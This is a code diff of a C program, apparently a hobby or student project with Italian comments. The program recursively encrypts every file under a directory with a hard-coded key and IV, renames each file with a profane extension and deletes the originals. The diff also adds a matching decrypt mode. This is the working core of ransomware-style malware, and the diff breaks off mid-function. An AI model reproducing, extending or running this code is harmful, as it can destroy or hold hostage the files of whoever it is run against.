decryption and main

+++ main.c
@@ -10,13 +10,25 @@
 
 char* iv = "qwertyuiopasd";
 char* key = "asdfghjklzxcvbnmqwertyuiopasdfgh";
-char* ext = ".crypt";
+char* ext = ".fuck";
 
 int VisitCrypt(char* path);
+int VisitDecrypt(char* path);
 
 int main(int argc, char const *argv[]) {
-  char* path = "test";
-  VisitCrypt(path);
+
+  if(argc == 3){
+    char* path = (char*) argv[2];
+    if(strcmp(argv[1],"crypt") == 0)
+      VisitCrypt(path);
+    else if(strcmp(argv[1], "decrypt") == 0)
+      VisitDecrypt(path);
+    else
+      printf("An input error has occurred\n");
+  }
+  else
+    printf("An input error has occurred\n");
+
   return 0;
 }
 
@@ -35,7 +47,7 @@ int VisitCrypt(char* path){
   FILE *old, *nuovo;
 
   while((de=readdir(dr)) != NULL){
-    if(strcmp(de->d_name,".") != 0 && strcmp(de->d_name,"..") != 0 && strstr(de->d_name,".crypt") == NULL){
+    if(strcmp(de->d_name,".") != 0 && strcmp(de->d_name,"..") != 0 && strstr(de->d_name,ext) == NULL){
       #ifdef DEBUG
       printf("VISITO %s CHE CONTIENE %s\n", path, de->d_name);
       #endif
@@ -46,6 +58,50 @@ int VisitCrypt(char* path){
         old = fopen(toVisit, "rb");
         nuovo = fopen(newName, "wb");
         encrypt(old,nuovo,key,iv);
+        #ifdef DEBUG
+        printf("criptato\n");
+        #endif
+        deleteFile(toVisit);
+        fclose(old);
+        fclose(nuovo);
+        free(newName);
+      }
+      free(toVisit);
+    }
+  }
+  closedir(dr);
+  return 1;
+}
+
+int VisitDecrypt(char* path){
+  struct dirent *de;
+  DIR *dr = opendir(path);
+  //passo base
+  if(dr == NULL){
+    #ifdef DEBUG
+    printf("%s è un file\n", path);
+    #endif
+    return 0;
+  }
+
+  char *newName, *toVisit;
+  FILE *old, *nuovo;
+
+  while((de=readdir(dr)) != NULL){
+    if(strcmp(de->d_name,".") != 0 && strcmp(de->d_name,"..") != 0){
+      #ifdef DEBUG
+      printf("VISITO %s CHE CONTIENE %s\n", path, de->d_name);
+      #endif
+      toVisit = linkStr(path, de->d_name, 1);
+      //passo ricorsivo
+      if(VisitDecrypt(toVisit) == 0 && strstr(de->d_name,ext) != NULL){
+        newName = removeLastChars(toVisit, strlen(ext));
+        old = fopen(toVisit, "rb");
+        nuovo = fopen(newName, "wb");
+        decrypt(old,nuovo,key,iv);
+        #ifdef DEBUG
+        printf("decriptato\n");
+        #endif
         deleteFile(toVisit);
         fclose(old);
         fclose(nuovo);
